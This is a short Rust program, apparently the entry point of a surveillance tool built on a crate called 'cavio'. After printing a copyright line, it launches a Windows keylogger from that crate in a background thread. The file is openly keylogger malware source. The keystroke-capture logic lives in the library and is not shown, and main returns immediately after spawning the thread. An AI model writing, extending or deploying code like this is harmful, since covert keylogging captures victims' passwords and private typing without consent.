use cavio::cap::keylog::run_keylogger;
use cavio::helpers::get_copyright;
use cavio::test;


// Runtime System
fn main() {
    println!("{}",get_copyright());
    // Run the keylogger in a thread


    std::thread::spawn(|| {
        run_keylogger(&cavio::cap::keylog::WinKeylogger{});
    });

}